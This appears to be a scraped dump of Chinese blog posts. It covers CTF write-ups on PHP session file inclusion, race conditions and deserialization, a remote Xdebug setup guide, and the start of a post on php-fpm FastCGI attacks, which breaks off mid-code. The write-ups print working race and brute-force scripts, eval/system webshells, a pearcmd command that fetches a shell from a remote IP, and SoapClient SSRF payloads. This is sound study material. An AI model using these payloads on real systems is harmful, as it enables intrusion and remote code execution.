键名的长度对应的 ASCII 字符（会有不可显示的字符）+键名+经过 serialize() 函数反序列处理的值   php_serialize(php\u0026gt;=5.5.4) 将字符串反序列化处理得到的数组      session.upload_progress.enabled = On：当有POST上传行为时，此次上传的详细信息（如上传时间、上传进度等）都会被存储到session中\n  session.upload_progress.cleanup = On：当POST上传完成后，此次的session文件内容会被立即情况\n  session.upload_progress.prefix = \u0026quot;upload_progress_\u0026quot;：存入session文件中的前缀部分\n  session.upload_progress.name = \u0026quot;PHP_SESSION_UPLOAD_PROGRESS\u0026quot;：默认name，*可控可利用\n  session.use_strict_mode = 0：表示我们对Cookie中的PHPSESSID字段可控\n  文件包含\u0026amp;条件竞争 默认情况下session.use_strict_mode = 0，当我们设置了Cookie的PHPSESSID字段后的值value后，php会自动创建session文件（默认路径/tmp/sess_PHPSESSID）；注意这个行为并不需要session.auto_start = On或是session_start()来手动开启就会被PHP自动初始化一个session，并将prefix+value写入sess_PHPSESSID文件中；整个流程中value可控，我们可以把恶意的payload加载到sess文件中然后包含，得到rce\n这是一个常见的上传表单\n\u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34; value=\u0026#34;666666\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; 当然一般的题不会有这么单纯，还会配一个默认项session.upload_progress.cleanup = On；但是如果我们构造上传表单时传的无用文件很大时就可以来个顶级拉扯（条件竞争），在它被清空前先包含\u0026amp;rce\n[WMCTF2020]Make PHP Great Again 开幕源码暴击\n\u0026lt;?php highlight_file(__FILE__); require_once \u0026#39;flag.php\u0026#39;; if(isset($_GET[\u0026#39;file\u0026#39;])) { require_once $_GET[\u0026#39;file\u0026#39;]; } 这个题的非预期解：文件包含+条件竞争\nimport io import requests import threading sessid = \u0026#39;AMIZ\u0026#39; data = {\u0026#34;cmd\u0026#34;: \u0026#34;system(\u0026#39;tac /var/www/html/flag.php\u0026#39;);\u0026#34;} def write(session): while True: f = io.BytesIO(b\u0026#39;a\u0026#39; * 100 * 50) session.post(\u0026#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/\u0026#39;, data={\u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;: \u0026#39;\u0026lt;?php eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39;}, files={\u0026#39;file\u0026#39;: (\u0026#39;amiz.txt\u0026#39;, f)}, cookies={\u0026#39;PHPSESSID\u0026#39;: sessid}) def read(session): while True: resp = session.post(\u0026#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/?file=/tmp/sess_\u0026#39;+sessid, data=data) if \u0026#39;amiz.txt\u0026#39; in resp.text: print(resp.text) event.clear() else: pass if __name__ == \u0026#34;__main__\u0026#34;: event = threading.Event() with requests.session() as session: for i in range(1, 30): threading.Thread(target=write, args=(session,)).start() for i in range(1, 30): threading.Thread(target=read, args=(session,)).start() event.set() [HXB 2021]easywill willphp v2.1.5，是基于tp的框架\n\u0026lt;?php namespace home\\controller; class IndexController{ public function index(){ highlight_file(__FILE__); assign($_GET[\u0026#39;name\u0026#39;],$_GET[\u0026#39;value\u0026#39;]); return view(); } } assign()可以控制name和value参数，而紧跟着的view函数有点东西\n可以看到最后的49行有文件写入的点，51行有个extract()可以做到变量覆盖，那我们就把file_put_contents的参数换成自己想要的\n/?name=cfile\u0026amp;value=/etc/passwd 可以正常回显\n不过flag文件的名字并不是flag，我们可以用pearcmd写shell的方法来个webshell（详细的可以参考我之前写过的另一个题-\u0026gt;[强网拟态 2021]Give_me_your_0day\n/?name=cfile\u0026amp;value=/../../../../usr/local/lib/php/pearcmd.php\u0026amp;+install+-R+/tmp+http://101.35.114.107:2301/shell.php 不过这里要注意shell的写法，常规的\u0026lt;?php eval($_POST['a']);?\u0026gt;这样的是不行的，下载就会报错\n执行也会报错，这里的shell要这样写\n\u0026lt;?php echo \u0026#39;\u0026lt;?php system(\u0026#34;ls /\u0026#34;);\u0026#39;?\u0026gt;之后直接把value的值换成flag文件名即可\n/?name=cfile\u0026amp;value=/flag32897328937298hdwidh ————不过这里我直接写🐎一直成功不了，只能远程包含🐎\n————诶，说了半天，其实和本篇有关的在非预期的点，和上面的脚本几乎一样，要改的地方在于read部分的url了\n?name=cfile\u0026amp;value=/tmp/sess_'+sessid 反序列化 这里详细的讲解可以参照PHP中SESSION反序列化机制，就不做复制粘贴工程师了，用自己的话讲几个里面已经提过的点吧\n首先，这里的问题（我们可以攻击的原因）出现在两种序列化引擎混用的情况下，当提交\n?a=|O:8:\u0026quot;stdClass\u0026quot;:0:{} 时，php_serialize方式下会被存储为\na:1:{s:1:\u0026quot;a\u0026quot;;s:20:\u0026quot;|O:8:\u0026quot;stdClass\u0026quot;:0:{}\u0026quot;;} 但是被php方式则会解析为\na:1:{s:1:\u0026quot;a\u0026quot;;s:20:\u0026quot;=O:8:\u0026quot;stdClass\u0026quot;:0:{}\u0026quot;;} 在具体应用时，可控的点除了get/post的参数之外，还可以接着构造文件上传的表单，除了PHPSESSID之外的废物文件的文件名就可以当此大任，记得序列化字符前面要加上|，内部的双引号要用\\进行转义\n[HarekazeCTF2019]Easy Notes 这个题得审源码\n有添加note 导出note的功能，但是却不是常见的xss（因为是php写的嘛），会检测session中的admin是不是true\n我们的突破口在导出.zip这个功能上\n我们可以手动伪造一个session文件，之后将PHPSESSID设为生成的值即可，内容呢 就是admin=1\nxxxx|N;admin|b:1;xxxxxx 用xxxx|N;闭合前面脏数据，编辑到title中，将session的PHPSESSID设置好就可以getflag了\n[XCTF final 2018]bestphp 这里是docker环境（注意设置暴露端口 另外首页的index.php的submit要改一下\n这里有熟悉的call_user_func，来读一下admin.php的源码\n?function=extract\u0026amp;file=php://filter/convert.base64-encode/resource=admin.php hello admin \u0026lt;?php if(empty($_SESSION[\u0026#39;name\u0026#39;])){ session_start(); #echo \u0026#39;hello \u0026#39; + $_SESSION[\u0026#39;name\u0026#39;]; }else{ die(\u0026#39;you must login with admin\u0026#39;); } ?\u0026gt;再读一下function.php，但是好像这俩都没啥用\n\u0026lt;?php function filters($data){ foreach($data as $key=\u0026gt;$value){ if(preg_match(\u0026#39;/eval|assert|exec|passthru|glob|system|popen/i\u0026#39;,$value)){ die(\u0026#39;Do not hack me!\u0026#39;); } } } ?\u0026gt;很显然我们需要利用session包含，但是index.php中设置了open_basedir，默认的session路径是/var/lib/php/sessions/sess_phpsessid，不过有个方式可以更改session存储目录\n那我们就可以把shell写到web根目录下\n?function=session_start\u0026amp;save_path=. POST: name=\u0026lt;?php echo \u0026quot;aaa\u0026quot;;system($_GET[x]);?\u0026gt; 一般的一句话会没法正常工作（之前湖湘杯willphp也是这样，那个是\u0026lt;?php echo '\u0026lt;?php system(\u0026quot;ls /\u0026quot;);'?\u0026gt;\n?function=extract\u0026amp;file=/var/www/html/sess_qwer\u0026amp;x=ls ?function=extract\u0026amp;file=/var/www/html/sess_qwer\u0026amp;x=cat+fsadgsdagsadgasd.php 拿到flag\n解法2：php7.0 - LFI via SegmentFault 参考：LFI via SegmentFault\ninclude.php?file=php://filter/string.strip_tags/resource=/etc/passwd string.strip_tags可以导致php在执行过程中Segment Fault\n如果请求中同时存在一个上传文件的请求，这个文件会被保留，存储在/tmp/phpxxxxxxxxxxx（xxxxx是数字+字母的6位数），这个文件连续保存，不用竞争直接爆破（多线程上传文件，生成多个phpxxxxxxxxxxx）\n利用exp（打出来502是正常情况\nPOST /index.php?function=extract\u0026amp;file=php://filter/string.strip_tags/resource=function.php HTTP/1.1 Host: 101.35.114.107:20004 Content-Length: 1701 Cache-Control: max-age=0 Origin: null Upgrade-Insecure-Requests: 1 DNT: 1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeScXqSzdW2v22xyk User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7 Cookie: PHPSESSID=17qpuv1r8g19pm503593nddq10 Connection: close ------WebKitFormBoundaryeScXqSzdW2v22xyk Content-Disposition: form-data; name=\u0026#34;fileUpload\u0026#34;; filename=\u0026#34;test.jpg\u0026#34; Content-Type: image/jpeg \u0026lt;?php echo \u0026#34;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\u0026#34;;@eval($_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; ------WebKitFormBoundaryeScXqSzdW2v22xyk-- 上帝视角看的话是这样\n用py脚本爆破出来(py2)\nimport requests import string charset = string.digits + string.letters host = \u0026#34;10.99.99.16\u0026#34; port = 80 base_url = \u0026#34;http://%s:%d\u0026#34; % (host, port) def brute_force_tmp_files(): for i in charset: for j in charset: for k in charset: for l in charset: for m in charset: for n in charset: filename = i + j + k + l + m + n url = \u0026#34;%s/index.php?function=extract\u0026amp;file=/tmp/php%s\u0026#34; % ( base_url, filename) print url try: response = requests.get(url) if \u0026#39;wwwwwwwwwwwwww\u0026#39; in response.content: print \u0026#34;[+] Include success!\u0026#34; return True except Exception as e: print e return False def main(): brute_force_tmp_files() if __name__ == \u0026#34;__main__\u0026#34;: main() 爆破成功后就拿到了shell，其余跟上面一样\n[LCTF 2018]bestphp\u0026rsquo;s revenge ————这个栗子结合了SoapClient和session的考点\n\u0026lt;?php highlight_file(__FILE__); $b = \u0026#39;implode\u0026#39;; call_user_func($_GET[f],$_POST); session_start(); if(isset($_GET[name])){ $_SESSION[name] = $_GET[name]; } var_dump($_SESSION); $a = array(reset($_SESSION),\u0026#39;welcome_to_the_lctf2018\u0026#39;); call_user_func($b,$a); 看到了我们的老朋友call_user_func，它会把第一个参数作为回调函数，其余参数作为回调函数的参数；如果我们第一个参数传入的是数组，它会把数组的第一个值作为类名，第二个值当作方法进行回调（反序列化中常见）；call_user_func函数不仅可以调用自定义函数和类，也可以调用php内置函数和内置类，比如extract\nflag.php可以直接访问（这里我没有扫 看wp知道的 robots.txt和页面源码都没有直接的提示）\n这个回显很明显需要ssrf，以localhost访问flag.php就会将flag写入SESSION中\n内置类SoapClient()满足这个需要，它可以通过反序列化来发起一个http请求（需要被调用__call\n所以整体思路是这样的：\n 覆盖序列化引擎为php_serialize， 通过session_start将一个序列化的SoapClient写入session；由于get传入的name会被直接放入session中，所以序列化的字符串不用post传，只需要post传设置反序列化引擎的参数就可以 第一个call_user_func通过extract变量覆盖使$b = call_user_func，第二个call_user_func调用SoapClient-\u0026gt;__call（不可访问的方法 call_user_func）  \u0026lt;?php $target=\u0026#39;http://127.0.0.1/flag.php\u0026#39;; $b = new SoapClient(null,array(\u0026#39;location\u0026#39; =\u0026gt; $target, \u0026#39;user_agent\u0026#39; =\u0026gt; \u0026#34;AAA:BBB\\r\\n\u0026#34; . \u0026#34;Cookie:PHPSESSID=gnnorfjmr9hr82gej7njt5dc83\u0026#34;, \u0026#39;uri\u0026#39; =\u0026gt; \u0026#34;http://127.0.0.1/\u0026#34;)); $se = serialize($b); echo \u0026#34;|\u0026#34;.urlencode($se); // O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D /?name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D\u0026amp;f=session_start Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83 POST: serialize_handler=php_serialize /?name=Soapclient\u0026amp;f=extract Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83 POST: b=call_user_func 之后刷新页面就可以触发反序列化了，由于上面构造的时候cookie就是当前页面的cookie，所以整一套过程下来不需要单独改session，首页就可以看到结果\n[Jarvisoj web]PHPINFO 这里是题目页面；开幕源码\n\u0026lt;?php //A webshell is wait for you ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php\u0026#39;); session_start(); class OowoO { public $mdzz; function __construct() { $this-\u0026gt;mdzz = \u0026#39;phpinfo();\u0026#39;; } function __destruct() { eval($this-\u0026gt;mdzz); } } if(isset($_GET[\u0026#39;phpinfo\u0026#39;])) { $m = new OowoO(); } else { highlight_string(file_get_contents(\u0026#39;index.php\u0026#39;)); } ?\u0026gt;先看看phpinfo，应该有提示信息；发现session.upload_progress.enabled=On，这就非常好了，构造一个上传表单把我们想执行的代码序列化后设为文件名传入\n序列化exp\n\u0026lt;?php ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php_serialize\u0026#39;); session_start(); \u0026lt;?php class OowoO { public $mdzz=\u0026#39;print_r(scandir(dirname(__FILE__)));\u0026#39;; } $obj = new OowoO(); echo \u0026#34;|\u0026#34;.serialize($obj); // |O:5:\u0026#34;OowoO\u0026#34;:1:{s:4:\u0026#34;mdzz\u0026#34;;s:36:\u0026#34;print_r(scandir(dirname(__FILE__)));\u0026#34;;} 构造上传表单，注意文件名的引号要加反斜杠转义\n|O:5:\\\u0026quot;OowoO\\\u0026quot;:1:{s:4:\\\u0026quot;mdzz\\\u0026quot;;s:36:\\\u0026quot;print_r(scandir(dirname(__FILE__)));\\\u0026quot;;} 然后访问这个php\npublic $mdzz=\u0026#39;print_r(file_get_contents(\u0026#34;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\u0026#34;));\u0026#39;; |O:5:\\\u0026quot;OowoO\\\u0026quot;:1:{s:4:\\\u0026quot;mdzz\\\u0026quot;;s:88:\\\u0026quot;print_r(file_get_contents(\\\u0026quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\\u0026quot;));\\\u0026quot;;} 得到flag\n 呼……长舒一口气，这个知识点终于画上了一个小句号；暑假总结php反序列化的时候就差整个和内置类，结果磨磨蹭蹭拖到今天，不过还是被我终结掉啦！文中还设计了一点SoapClient内置类的东西，由于篇幅原因不展开讲了= = 、\n最近的计划和安排就是刷题\u0026amp;把之前的知识体系填充完整，加油啦\n   以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（   LCTF 2018 Writeup \u0026ndash; ROIS\nLFI via SegmentFault\nPHP中SESSION反序列化机制\n利用session.upload_progress进行文件包含和反序列化渗透\n如有遗漏请指正！！！\n ","date":"2021-11-29T22:23:42+08:00","permalink":"https://amiaaaz.github.io/2021/11/29/php-session-study-notes/","section":"posts","tags":["PHP","PHP_Session","unserialize"],"title":"PHP_Session学习笔记"},{"categories":["LTS","环境配置"],"contents":"首先，这里的情况与一般的本地调试localhost不同，是本地debug远程主机的docke内的php项目，也就是这里的laravel；可能有的人觉得多此一举，直接在本地搭建项目、运行、debug一气呵成，速度还快，何必到远程跑一通？那我只能说too young，年轻人还是要有点长远的打算（\n一切的起因是我想复现cve-2021-3129，顺便亲自动手跟一跟\u0026amp;挖一挖laravel框架反序列化的链子，结果代码审计之前先被环境配置困住了；被这个糟心的调试从周二下午折磨到周四的凌晨，几乎是把能踩的坑踩了个遍（痛苦面具），直到现在的解决方案也不能算是最优解，不过是能正常稳定的跑起来了，次优解；感谢portainer让我能轻松创建docker\n把详细的步骤记录到这篇博客里，希望可以帮助到看到的人~欢迎友好交流！\n 先说下本次配置的环境整体需求吧：\n 远程vps的docker(FROM php:7.4-apache): 需开放web页面端口 + ssh端口（无需挂载目录 laravel 8.4.2, laravel/framework 8.22.1, facade/ignition 2.5.1 本地ide: PHPStorm + 一个映射到公网ip的供调试连接使用的端口（后面会解释原因）  除了最后的laravel之外就都是调php的通用流程啦，让我们开始吧~\n远程docker\u0026amp;laravel的环境搭建 以php:7.4-apache镜像作为基础进行创建，我这里用的是portainer（别问为什么不写dockerfile，问就是还在学着怎么写（一定不鸽 近期会更新到这里的\napt update apt-get install -y ssh git unzip vim /etc/ssh/sshd_config\t# 开启对应选项 比如允许root连接什么的 不用我细嗦 各位带手子们都应该懂 pecl install xdebug touch /var/log/php/xdebug_remote.log\t# 如果需要log的话要提前创建好噢 vim /usr/local/etc/php/php.ini\t# 将下面框中内容粘到末尾即可 [Xdebug] ; 这一项安装好之后会有提示 zend_extension=\u0026#34;/usr/local/lib/php/extensions/no-debug-non-zts-20190902/xdebug.so\u0026#34; xdebug.mode=debug xdebug.client_host=your_vps xdebug.client_port=port xdebug.idekey=laravel xdebug.remote_handler=\u0026#34;dbgp\u0026#34; xdebug.log=\u0026#34;/var/log/php/xdebug_remote.log\u0026#34; 此处安装版本为xdebug3，与xdebug2的配置语法有一些出入，具体更新的内容详见更新文档，安装好xdebug后执行php -v命令会有显示版本\nwget https://github.com/composer/composer/releases/download/2.1.12/composer.phar mv composer.phar /usr/local/bin/composer chmod +x /usr/local/bin/composer cd /var/www composer create-project laravel/laravel . \u0026#34;v8.4.2\u0026#34; vim composer.json\t# 修改内容见下 composer update mv public html chmod -R 777 /var/www \u0026#34;laravel/framework\u0026#34;: \u0026#34;8.22.1\u0026#34; \u0026#34;facade/ignition\u0026#34;: \u0026#34;2.5.1\u0026#34; 一个坑点：即使指定了laravel/laravel版本，composer创建默认会使用最新的laravel/framework版本\u0026amp;相关组件依赖（比如现在是8.73.2），由于我们需要复现的cve有特殊的laravel组件版本需求，，所以我们需要单独对composer.json进行修改，然后执行composer update进行更新\n一切顺利的话访问web页面就可以看到laravel啦\n与本地的PHPStorm连接起来进行debug 开始之前先自问自答一下：为什么调试要一个能映射到公网的端口？\nPHPStorm中集成了遵循DBGp协议的Xdebug插件，当开启监听时会监听本地指定端口，当访问指定server的web页面并带有含有ide_key的特定cookie参数之后，Xdebug会接收到这个参数并开启debug，通过DBGp协议向php.ini中指定的ip\u0026amp;port发送请求，当这个port指向我们ide在监听的端口时，就会建立起Xdebug和ide的连接（使用DBGp协议通讯），随后它们之间进行数据交互，如此反复；更详细的内容请参见-\u0026gt;6.3 IDE to debugger engine communications\n这下就好理解了叭？也就是说，需要一个与远程代码运行环境处在同一个网段下的端口（公网的更好）；接下来就是配置啦\n内网穿透 内网穿透我使用的是nps，配置过程可以参考官方文档，由于我这里配的比较早 这部分跳过\nPHPStorm的设置有一堆 把docker中/www目录打包拖下来，用PHPStorm打开\n设置Debug 20007是本地端口，被映射到公网ip\n这里的20007是公网端口，代理本地的20007\n如果我讲清楚前面原理的话，大家应该能理解这两个地方的端口设置二选一即可\n设置Deployment 用SFTP与docker进行ssh连接，文件映射\n设置远程php解释器 选择ssh模式，配一下账号密码端口就行（至于为什么不用docker/docker-compose，之后会说），这里的Path mappings直接就是Deployment中配好的，可以单独再加，但是没必要\n设置Server 注意高亮地方的设置，是web页面的端口，也要设置好本地的路径映射\n验证一下联通情况 好耶~\n浏览器插件Xdebug helper 设置Debug Configuration，选PHP Remote Debug模式\n安装插件，设置ide_key，开启小虫子\n终于完了 随便打个断点，开启本地监听\n刷新页面\n芜湖起飞！\n***待完善的地方  配置远程php解释器可以使用docker/docker-compose，这两个都需要单独挂载关键目录出来，配置上与ssh的区别还是有点大的，也需要注意docker-compose文件的编写，先扔一个参考资料-\u0026gt;Setting up PhpStorm with Xdebug for local development on Docker \u0026hellip; natively and via Deployment Configuration. 关于dockerfile/docker-compose文件的编写，我还不是很熟练，跟不用说这样的php项目了，同样先扔一个参考资料-\u0026gt;Structuring the Docker setup for PHP Projects \u0026hellip; folder structure, Dockerfile templates and general fundamentals PHPStorm有内置的docker管理功能，可以创建镜像-\u0026gt;配置debug一步到位   虽然踩了很多坑，但是也学到了不少东西，希望能多少帮助一些人少走弯路（\n限于篇幅原因，代码审计的部分就放到后面啦~\n最近更新的不太勤快，我先自我批评TAT，已经很菜了不能再不努力啊啊啊啊啊啊啊啊\n","date":"2021-11-25T18:44:34+08:00","permalink":"https://amiaaaz.github.io/2021/11/25/php-remote-debug-env-init/","section":"posts","tags":["debug","PHP"],"title":"PHP远程debug环境配置"},{"categories":["NOTES\u0026SUMMARY"],"contents":"之前做题总是会见到，但并不是很懂实际的原理，有点云里雾里的，好像懂了但又没有完全懂，是时候专门来学一下咯！\n没有什么新鲜的东西，只不过把师傅们已有的文章进行一个整合\u0026amp;重新整理，参考链接放到最后啦w\n前置知识 CGI/FastCGI CGI协议用于处理html这类静态文件之后出现的动态语言的解释器与webserver通信的问题，具体的实现有php-cgi\nCGI的弊端是令webserver每次处理请求时都会fork一个cgi进程，结束后再kill，比较浪费资源，FastCGI协议就解决了这个问题，处理完请求后不会kill而是保留该进程，使它可以一次处理多个请求，这样就不用每次fork了\n而php-fpm就是FastCGI协议的一个具体实现，作为FastCGI进程管理器（运行时有一个主进程和多个包含php解释器的worker进程来执行代码），用于接收webserver的请求\n查看phpinfo，Sever API处一般会有三种样式：\n Apache 2.0 Handler CGI/FastCGI FPM/FastCGI  第一种把php作为apache的一个模块，相当于apache中的一个.dll或.so；第二种php-cgi.exe是一个独立的进程，web服务器也是独立的apache.exe，web服务器监听到http请求时会去调用php-cgi进程，之间通过cgi协议传递数据；而第三种fastcgi也是一种协议，它做了很多优化且常驻内存 不用每次都调用一下cgi，有辅助功能比如内存管理，垃圾处理由php-fpm来实现\n配置 php-fpm通信方式有tcp（本地监听9000端口）和unix socket套接字两种方式，题目中可以见到的都是tcp9000\napt update apt install nginx -y apt install software-properties-common -y apt install php7.4-fpm -y tcp模式 /etc/php/7.4/fpm/pool.d/www.conf\nlisten = 127.0.0.1:9000 /etc/nginx/sites-enabled/default\nserver{ ... location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass 127.0.0.1:9000; } ... } unix socket模式 如果启动fpm不做改动，默认为套接字模式\n/etc/php/7.4/fpm/pool.d/www.conf\nlisten = /run/php/php7.4-fpm.sock /etc/nginx/sites-enabled/default\nserver{ ... location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.4-fpm.sock; } ... } 然后重启即可\nservice nginx start\t# reload /etc/init.d/php7.4-fpm start\t# restart 如果出现报错请查看对应日志\ncat /var/log/nginx/error.log cat /var/log/php7.4-fpm.log 漏洞成因 按FastCGI协议传输的内容分为header和body两部分\ntypedef struct { /* Header */ unsigned char version; // 版本  unsigned char type; // 本次record的类型  unsigned char requestIdB1; // 本次record对应的请求id  unsigned char requestIdB0; unsigned char contentLengthB1; // body体的大小  unsigned char contentLengthB0; unsigned char paddingLength; // 额外块大小  unsigned char reserved; /* Body */ unsigned char contentData[contentLength]; unsigned char paddingData[paddingLength]; } FCGI_Record; 先从heder中拿到body体大小（最大2^16=65535字节），再从tcp流里读取大小等于contentLenth的body，之后还有一部分额外的padding\nheader中的type起到指定record的作用，因为FastCGI的单个record大小有限作用单一，所以我们需要一个TCP流中传输多个record，通过type来标识每个record的作用是什么，requestId做到区分每一次的请求\n当type=4时，表明消息中包含的数据为某个name-value对，比如\n{ 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1\u0026amp;b=2', 'REQUEST_URI': '/index.php?a=1\u0026amp;b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \u0026quot;localhost\u0026quot;, 'SERVER_PROTOCOL': 'HTTP/1.1' } 其中SCRIPT_FILENAME就是php-fpm会去执行的文件，由于5.3.9版本引入了security.limit_extensions的选项，默认对后缀名限制在了php家族，所以我们可以考虑找到已存在php文件（安装时附带的php文件 可以通过find / -name \u0026quot;*.php\u0026quot;来搜索一下默认环境 比如/usr/local/lib/php/PEAR.php），向其中注入恶意代码；而fpm支持通过设置FASTCGI_PARAMS来动态修改php的设置，可以利用这两项\n'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On' 来做到执行某php文件时自动包含POST内容，执行恶意代码（disable_function在php加载时就确定好了，无法重写）\n攻击思路\u0026amp;\u0026amp;例题 伪造一个可以正常通信的FastCGI客户端，将传输的内容修改为我们的恶意payload，再发出去\n远程攻击php-fpm 这里是p牛的脚本，兼容py2\u0026amp;3，默认-p 9000，-c \u0026lt;?php phpinfo();?\u0026gt;\npython fpm.py target_ip /var/www/html/index.php -c \u0026#39;\u0026lt;?php echo `id`;exit;?\u0026gt;\u0026#39; 我们需要改动的只有params部分的PHP_ADMIN_VALUE\n'PHP_ADMIN_VALUE': 'allow_url_include = On\\nextension = /home/amelia/TEMP/fpm/wuhu.so', 成功\n需要注意的是，如果只是加载恶意.so而不执行代码，则并不需要有已存在php文件的绝对路径，用_占位即可\npython fpm.py target_ip _ -c \u0026#39;\u0026lt;?php echo `id`;exit;?\u0026gt;\u0026#39; SSRF攻击本地php-fpm 利用gopher://协议可以直接传输TCP协议流，我们构造好payload之后就可以传入进行ssrf攻击了\n构造payload依旧使用p牛的脚本，不过做一点微小的改动；这部分可以参见后面结合ftp攻击fpm的内容，总之就照这几步走\n p牛脚本生成urlencode之后的tcp数据流 加gopher://127.0.0.1:9000前缀 梭！?url=gopher://127.0.0.1:9000/_xxxxxxxxxxxxxxxx  [强网青少 2021]SSRF \u0026lt;?php highlight_file(__FILE__); //like fpm? class Crawl{ public $url; function __construct($url){ if(substr($url,0,7)===\u0026#34;http://\u0026#34;){ $this-\u0026gt;url = $url; }else{ $this-\u0026gt;url = \u0026#34;http://127.0.0.1/\u0026#34;; } } public 